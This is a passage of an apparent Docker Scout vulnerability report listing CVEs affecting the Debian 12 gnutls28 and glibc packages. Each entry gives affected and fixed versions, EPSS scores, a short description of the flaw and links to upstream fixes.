A NULL pointer dereference flaw was found in the GnuTLS software in _gnutls_figure_common_ciphersuite().

---
- gnutls28 3.8.9-3
https://lists.gnupg.org/pipermail/gnutls-help/2025-July/004883.html
https://gitlab.com/gnutls/gnutls/-/issues/1718
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/23135619773e6ec087ff2abc65405bd4d5676bad (3.8.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32990?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u5"><img alt="medium : CVE--2025--32990" src="https://img.shields.io/badge/CVE--2025--32990-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.292%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-buffer-overflow (off-by-one) flaw was found in the GnuTLS software in the template parsing logic within the certtool utility. When it reads certain settings from a template file, it allows an attacker to cause an out-of-bounds (OOB) NULL pointer write, resulting in memory corruption and a denial-of-service (DoS) that could potentially crash the system.

---
- gnutls28 3.8.9-3
https://lists.gnupg.org/pipermail/gnutls-help/2025-July/004883.html
https://gitlab.com/gnutls/gnutls/-/issues/1696
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/408bed40c36a4cc98f0c94a818f682810f731f32 (3.8.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32988?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u5"><img alt="medium : CVE--2025--32988" src="https://img.shields.io/badge/CVE--2025--32988-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.228%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GnuTLS. A double-free vulnerability exists in GnuTLS due to incorrect ownership handling in the export logic of Subject Alternative Name (SAN) entries containing an otherName. If the type-id OID is invalid or malformed, GnuTLS will call asn1_delete_structure() on an ASN.1 node it does not own, leading to a double-free condition when the parent function or caller later attempts to free the same structure.  This vulnerability can be triggered using only public GnuTLS APIs and may result in denial of service or memory corruption, depending on allocator behavior.

---
- gnutls28 3.8.9-3
https://lists.gnupg.org/pipermail/gnutls-help/2025-July/004883.html
https://gitlab.com/gnutls/gnutls/-/issues/1694
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/608829769cbc247679ffe98841109fc73875e573 (3.8.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42015?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="medium : CVE--2026--42015" src="https://img.shields.io/badge/CVE--2026--42015-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.249%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. An off-by-one error exists in the PKCS#12 bag element bounds check. This vulnerability allows an remote attacker to write past the internal array of a PKCS#12 bag when appending to a bag that already contains 32 elements. This memory corruption could lead to a denial of service (DoS) or potentially other unspecified impacts.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-11
https://gitlab.com/gnutls/gnutls/-/work_items/1840
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/a3e7c50d3e1761e5ef1d4b225507cab8f2b2c3ca (3.8.13)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-14831?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u6"><img alt="medium : CVE--2025--14831" src="https://img.shields.io/badge/CVE--2025--14831-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.102%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GnuTLS. This vulnerability allows a denial of service (DoS) by excessive CPU (Central Processing Unit) and memory consumption via specially crafted malicious certificates containing a large number of name constraints and subject alternative names (SANs).

---
- gnutls28 3.8.12-1
https://gitlab.com/gnutls/gnutls/-/issues/1773
Prequisite: https://gitlab.com/gnutls/gnutls/-/commit/0b2377dfccd99be641bf3f1a0de9f0dc8dc0d4b1 (3.8.12)
Prequisite: https://gitlab.com/gnutls/gnutls/-/commit/85d6348a30c74d4ee3710e0f4652f634eaad6914 (3.8.12)
Prequisite: https://gitlab.com/gnutls/gnutls/-/commit/c28475413f82e1f34295d5c039f0c0a4ca2ee526 (3.8.12)
Prequisite: https://gitlab.com/gnutls/gnutls/-/commit/6db7da7fcfe230f445b1edbb56e2a8346120c891 (3.8.12)
Prequisite: https://gitlab.com/gnutls/gnutls/-/commit/094accd3ebec17ead6c391757eaa18763b72d83f (3.8.12)
Prequisite: https://gitlab.com/gnutls/gnutls/-/commit/bc62fbb946085527b4b1c02f337dd10c68c54690 (3.8.12)
Prequisite: https://gitlab.com/gnutls/gnutls/-/commit/80db5e90fa18d3e34bb91dd027bdf76d31e93dcd (3.8.12)
Prequisite: https://gitlab.com/gnutls/gnutls/-/commit/d0ac999620c8c0aeb6939e1e92d884ca8e40b759 (3.8.12)
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/d6054f0016db05fb5c82177ddbd0a4e8331059a1 (3.8.12)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-12243?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u4"><img alt="medium : CVE--2024--12243" src="https://img.shields.io/badge/CVE--2024--12243-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.227%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>80th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GnuTLS, which relies on libtasn1 for ASN.1 data processing. Due to an inefficient algorithm in libtasn1, decoding certain DER-encoded certificate data can take excessive time, leading to increased resource consumption. This flaw allows a remote attacker to send a specially crafted certificate, causing GnuTLS to become unresponsive or slow, resulting in a denial-of-service condition.

---
[experimental] - gnutls28 3.8.9-1
- gnutls28 3.8.9-2
https://www.gnutls.org/security-new.html#GNUTLS-SA-2025-02-07
https://lists.gnupg.org/pipermail/gnutls-help/2025-February/004875.html
https://gitlab.com/gnutls/gnutls/-/issues/1553
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/4760bc63531e3f5039e70ede91a20e1194410892 (3.8.9)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-9820?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u6"><img alt="medium : CVE--2025--9820" src="https://img.shields.io/badge/CVE--2025--9820-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the GnuTLS library, specifically in the gnutls_pkcs11_token_init() function that handles PKCS#11 token initialization. When a token label longer than expected is processed, the function writes past the end of a fixed-size stack buffer. This programming error can cause the application using GnuTLS to crash or, in certain conditions, be exploited for code execution. As a result, systems or applications relying on GnuTLS may be vulnerable to a denial of service or local privilege escalation attacks.

---
[experimental] - gnutls28 3.8.11-1
- gnutls28 3.8.11-3 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1121146)
[trixie] - gnutls28 3.8.9-3+deb13u1
[bookworm] - gnutls28 3.7.9-2+deb12u6
https://www.gnutls.org/security-new.html#GNUTLS-SA-2025-11-18
https://gitlab.com/gnutls/gnutls/-/issues/1732
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/1d56f96f6ab5034d677136b9d50b5a75dff0faf5 (3.8.11)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-5419?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="low : CVE--2026--5419" src="https://img.shields.io/badge/CVE--2026--5419-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.052%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in gnutls. The PKCS#7 padding check, performed during decryption, was not constant-time. This timing side-channel could allow a remote attacker to potentially leak sensitive information about the padding bytes through observable timing differences. This vulnerability is a form of information disclosure.

---
- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
[bullseye] - gnutls28 <not-affected> (Vulnerable code introduced later)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-13
https://gitlab.com/gnutls/gnutls/-/issues/1815
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/1e627aa5ad95c6dc0518d94e9a009997b081a1ab (3.8.13)
Introduced with: https://gitlab.com/gnutls/gnutls/-/commit/4b45ad6923a7b1d296a111153663f23c13173b94 (3.7.7)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-32989?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u5"><img alt="low : CVE--2025--32989" src="https://img.shields.io/badge/CVE--2025--32989-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u5</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.113%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-buffer-overread vulnerability was found in GnuTLS in how it handles the Certificate Transparency (CT) Signed Certificate Timestamp (SCT) extension during X.509 certificate parsing. This flaw allows a malicious user to create a certificate containing a malformed SCT extension (OID 1.3.6.1.4.1.11129.2.4.2) that contains sensitive data. This issue leads to the exposure of confidential information when GnuTLS verifies certificates from certain websites when the certificate (SCT) is not checked correctly.

---
- gnutls28 3.8.9-3
[bullseye] - gnutls28 <not-affected> (Vulnerable code introduced later)
https://lists.gnupg.org/pipermail/gnutls-help/2025-July/004883.html
https://gitlab.com/gnutls/gnutls/-/issues/1695
Introduced by: https://gitlab.com/gnutls/gnutls/-/commit/242abb6945cbb56c4a41c393d0253ea5b9d3a36a (3.7.3)
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/8e5ca951257202089246fa37e93a99d210ee5ca2 (3.8.10)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2011-3389?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3E0"><img alt="low : CVE--2011--3389" src="https://img.shields.io/badge/CVE--2011--3389-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>3.832%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>88th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The SSL protocol, as used in certain configurations in Microsoft Windows and Microsoft Internet Explorer, Mozilla Firefox, Google Chrome, Opera, and other products, encrypts data by using CBC mode with chained initialization vectors, which allows man-in-the-middle attackers to obtain plaintext HTTP headers via a blockwise chosen-boundary attack (BCBA) on an HTTPS session, in conjunction with JavaScript code that uses (1) the HTML5 WebSocket API, (2) the Java URLConnection API, or (3) the Silverlight WebClient API, aka a "BEAST" attack.

---
- sun-java6 <removed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=645881)
[lenny] - sun-java6 <no-dsa> (Non-free not supported)
[squeeze] - sun-java6 <no-dsa> (Non-free not supported)
- openjdk-6 6b23~pre11-1
- openjdk-7 7~b147-2.0-1
- iceweasel <not-affected> (Vulnerable code not present)
http://blog.mozilla.com/security/2011/09/27/attack-against-tls-protected-communications/
- chromium-browser 15.0.874.106~r107270-1
[squeeze] - chromium-browser <end-of-life>
- lighttpd 1.4.30-1
strictly speaking this is no lighttpd issue, but lighttpd adds a workaround
- curl 7.24.0-1
http://curl.haxx.se/docs/adv_20120124B.html
- python2.6 2.6.8-0.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=684511)
[squeeze] - python2.6 <no-dsa> (Minor issue)
- python2.7 2.7.3~rc1-1
- python3.1 <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=678998)
[squeeze] - python3.1 <no-dsa> (Minor issue)
- python3.2 3.2.3~rc1-1
http://bugs.python.org/issue13885
python3.1 is fixed starting 3.1.5
- cyassl <removed>
- gnutls26 <removed> (unimportant)
- gnutls28 <unfixed> (unimportant)
No mitigation for gnutls, it is recommended to use TLS 1.1 or 1.2 which is supported since 2.0.0
- haskell-tls <unfixed> (unimportant)
No mitigation for haskell-tls, it is recommended to use TLS 1.1, which is supported since 0.2
- matrixssl <removed> (low)
[squeeze] - matrixssl <no-dsa> (Minor issue)
[wheezy] - matrixssl <no-dsa> (Minor issue)
matrixssl fix this upstream in 3.2.2
- bouncycastle 1.49+dfsg-1
[squeeze] - bouncycastle <no-dsa> (Minor issue)
[wheezy] - bouncycastle <no-dsa> (Minor issue)
No mitigation for bouncycastle, it is recommended to use TLS 1.1, which is supported since 1.4.9
- nss 3.13.1.with.ckbi.1.88-1
https://bugzilla.mozilla.org/show_bug.cgi?id=665814
https://hg.mozilla.org/projects/nss/rev/7f7446fcc7ab
- polarssl <unfixed> (unimportant)
No mitigation for polarssl, it is recommended to use TLS 1.1, which is supported in all releases
- tlslite <removed>
[wheezy] - tlslite <no-dsa> (Minor issue)
- pound 2.6-2
Pound 2.6-2 added an anti_beast.patch to mitigate BEAST attacks.
- erlang 1:15.b-dfsg-1
[squeeze] - erlang <no-dsa> (Minor issue)
- asterisk 1:13.7.2~dfsg-1
[jessie] - asterisk 1:11.13.1~dfsg-2+deb8u1
[wheezy] - asterisk <no-dsa> (Minor issue)
[squeeze] - asterisk <end-of-life> (Not supported in Squeeze LTS)
http://downloads.digium.com/pub/security/AST-2016-001.html
https://issues.asterisk.org/jira/browse/ASTERISK-24972
patch for 11 (jessie): https://code.asterisk.org/code/changelog/asterisk?cs=f233bcd81d85626ce5bdd27b05bc95d131faf3e4
all versions vulnerable, backport required for wheezy

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-42014?s=debian&n=gnutls28&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.7.9-2%2Bdeb12u7"><img alt="unspecified : CVE--2026--42014" src="https://img.shields.io/badge/CVE--2026--42014-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.7.9-2+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>3.7.9-2+deb12u7</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

- gnutls28 3.8.13-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1135319)
https://www.gnutls.org/security-new.html#GNUTLS-SA-2026-04-29-9
https://gitlab.com/gnutls/gnutls/-/issues/1766
Fixed by: https://gitlab.com/gnutls/gnutls/-/commit/3957f136e2ed23caf176a594b54b3827f5cef701 (3.8.13)
Introduced with: https://gitlab.com/gnutls/gnutls/-/commit/f68a86202bd1aaeb3988566def4374359b211875 (gnutls_3_6_5)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 5" src="https://img.shields.io/badge/H-5-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 9" src="https://img.shields.io/badge/L-9-fce1a9"/> <!-- unspecified: 0 --><strong>glibc</strong> <code>2.36-9+deb12u8</code> (deb)</summary>

<small><code>pkg:deb/debian/glibc@2.36-9%2Bdeb12u8?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-0861?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u14"><img alt="high : CVE--2026--0861" src="https://img.shields.io/badge/CVE--2026--0861-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u14</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.010%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Passing too large an alignment to the memalign suite of functions (memalign, posix_memalign, aligned_alloc) in the GNU C Library version 2.30 to 2.42 may result in an integer overflow, which could consequently result in a heap corruption.  Note that the attacker must have control over both, the size as well as the alignment arguments of the memalign function to be able to exploit this.  The size parameter must be close enough to PTRDIFF_MAX so as to overflow size_t along with the large alignment argument.  This limits the malicious inputs for the alignment for memalign to the range [1<<62+ 1, 1<<63] and exactly 1<<63 for posix_memalign and aligned_alloc.  Typically the alignment argument passed to such functions is a known constrained quantity (e.g. page size, block size, struct sizes) and is not attacker controlled, because of which this may not be easily exploitable in practice.  An application bug could potentially result in the input alignment being too large, e.g. due to a different buffer overflow or integer overflow in the application or its dependent libraries, but that is again an uncommon usage pattern given typical sources of alignments.

---
- glibc 2.42-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1125678)
[trixie] - glibc 2.41-12+deb13u2
[bookworm] - glibc 2.36-9+deb12u14
https://sourceware.org/bugzilla/show_bug.cgi?id=33796
https://www.openwall.com/lists/oss-security/2026/01/16/5
Introduced with: https://sourceware.org/git/?p=glibc.git;a=commit;h=9bf8e29ca136094f73f69f725f15c51facc97206 (glibc-2.30)
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=c9188d333717d3ceb7e3020011651f424f749f93 (glibc-2.43)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-4802?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u11"><img alt="high : CVE--2025--4802" src="https://img.shields.io/badge/CVE--2025--4802-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u11</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.043%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Untrusted LD_LIBRARY_PATH environment variable vulnerability in the GNU C Library version 2.27 to 2.38 allows attacker controlled loading of dynamically shared library in statically compiled setuid binaries that call dlopen (including internal dlopen calls after setlocale or calls to NSS functions such as getaddrinfo).

---
- glibc 2.39-4
[bookworm] - glibc 2.36-9+deb12u11
Introduced with: https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=10e93d968716ab82931d593bada121c17c0a4b93 (glibc-2.27)
Fixed by: https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=5451fa962cd0a90a0e2ec1d8910a559ace02bba0 (glibc-2.39)
https://sourceware.org/bugzilla/show_bug.cgi?id=32976
https://www.openwall.com/lists/oss-security/2025/05/17/2

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-4046?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u14"><img alt="high : CVE--2026--4046" src="https://img.shields.io/badge/CVE--2026--4046-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u14</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.084%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The iconv() function in the GNU C Library versions 2.43 and earlier may crash due to an assertion failure when converting inputs from the IBM1390 or IBM1399 character sets, which may be used to remotely crash an application.    This vulnerability can be trivially mitigated by removing the IBM1390 and IBM1399 character sets from systems that do not need them.

---
- glibc 2.42-15 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1132499)
[trixie] - glibc 2.41-12+deb13u3
[bookworm] - glibc 2.36-9+deb12u14
https://sourceware.org/bugzilla/show_bug.cgi?id=33980
https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2026-0007
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=d6f08d1cf027f4eb2ba289a6cc66853722d4badc

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-0915?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u14"><img alt="high : CVE--2026--0915" src="https://img.shields.io/badge/CVE--2026--0915-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u14</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.023%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling getnetbyaddr or getnetbyaddr_r with a configured nsswitch.conf that specifies the library's DNS backend for networks and queries for a zero-valued network in the GNU C Library version 2.0 to version 2.42 can leak stack contents to the configured DNS resolver.

---
- glibc 2.42-8 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1125748)
[trixie] - glibc 2.41-12+deb13u2
[bookworm] - glibc 2.36-9+deb12u14
https://sourceware.org/bugzilla/show_bug.cgi?id=33802
https://www.openwall.com/lists/oss-security/2026/01/16/6
Introduced with: https://sourceware.org/git/?p=glibc.git;a=commit;h=5f0e6fc702296840d2daa39f83f6cb1e40073d58 (glibc-1.93)
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=e56ff82d5034ec66c6a78f517af6faa427f65b0b (glibc-2.43)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-15281?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u14"><img alt="high : CVE--2025--15281" src="https://img.shields.io/badge/CVE--2025--15281-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u14</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.090%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling wordexp with WRDE_REUSE in conjunction with WRDE_APPEND in the GNU C Library version 2.0 to version 2.42 may cause the interface to return uninitialized memory in the we_wordv member, which on subsequent calls to wordfree may abort the process.

---
- glibc 2.42-11 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1126266)
[trixie] - glibc 2.41-12+deb13u2
[bookworm] - glibc 2.36-9+deb12u14
https://www.openwall.com/lists/oss-security/2026/01/20/3
Introduced with: https://sourceware.org/git/?p=glibc.git;a=commit;h=8f2ece695d8822e9ecc63ecd157e90bf17a6fe65 (glibc-2.0.92)
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=80cc58ea2de214f85b0a1d902a3b668ad2ecb302 (glibc-2.43)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0395?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u10"><img alt="medium : CVE--2025--0395" src="https://img.shields.io/badge/CVE--2025--0395-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u10</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.071%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When the assert() function in the GNU C Library versions 2.13 to 2.40 fails, it does not allocate enough space for the assertion failure message string and size information, which may lead to a buffer overflow if the message string size aligns to page size.

---
- glibc 2.40-6
[bookworm] - glibc 2.36-9+deb12u10
https://sourceware.org/bugzilla/show_bug.cgi?id=32582
https://www.openwall.com/lists/oss-security/2025/01/22/4
Fixed by: https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=7d4b6bcae91f29d7b4daf15bab06b66cf1d2217c (2.40-branch)
Fixed by: https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=7971add7ee4171fdd8dfd17e7c04c4ed77a18845 (2.36-branch)
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2025-0001
https://sourceware.org/pipermail/libc-announce/2025/000044.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8058?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u13"><img alt="medium : CVE--2025--8058" src="https://img.shields.io/badge/CVE--2025--8058-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u13</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The regcomp function in the GNU C library version from 2.4 to 2.41 is  subject to a double free if some previous allocation fails. It can be  accomplished either by a malloc failure or by using an interposed malloc  that injects random malloc failures. The double free can allow buffer  manipulation depending of how the regex is constructed. This issue  affects all architectures and ABIs supported by the GNU C library.

---
- glibc 2.41-11 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1109803)
[bookworm] - glibc 2.36-9+deb12u13
https://sourceware.org/bugzilla/show_bug.cgi?id=33185
https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2025-0005
Introduced with: https://sourceware.org/git/?p=glibc.git;a=commit;h=963d8d782fc98fb6dc3a66f0068795f9920c269d (glibc-2.4)
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=7ea06e994093fa0bcca0d0ee2c1db271d8d7885d (glibc-2.42)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-4438?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u14"><img alt="low : CVE--2026--4438" src="https://img.shields.io/badge/CVE--2026--4438-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u14</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.066%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Calling gethostbyaddr or gethostbyaddr_r with a configured nsswitch.conf that specifies the library's DNS backend in the GNU C library version 2.34 to version 2.43 could result in an invalid DNS hostname being returned to the caller in violation of the DNS specification.

---
- glibc 2.42-14 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1131887)
[trixie] - glibc 2.41-12+deb13u3
[bookworm] - glibc 2.36-9+deb12u14
[bullseye] - glibc <not-affected> (introduced in v2.34)
https://sourceware.org/bugzilla/show_bug.cgi?id=34015
Proposed patch: https://inbox.sourceware.org/libc-alpha/20260320194250.1089143-1-carlos@<!-- -->redhat.com/
https://www.openwall.com/lists/oss-security/2026/03/23/2
Introduced with: https://sourceware.org/git/?p=glibc.git;a=commit;h=e32547d661a43da63368e488b6cfa9c53b4dcf92 (glibc-2.37)
Backported and introduced in glibc-2.36 branch: https://sourceware.org/git/?p=glibc.git;a=commit;h=77f523c473878ec0051582ef15161c6982879095
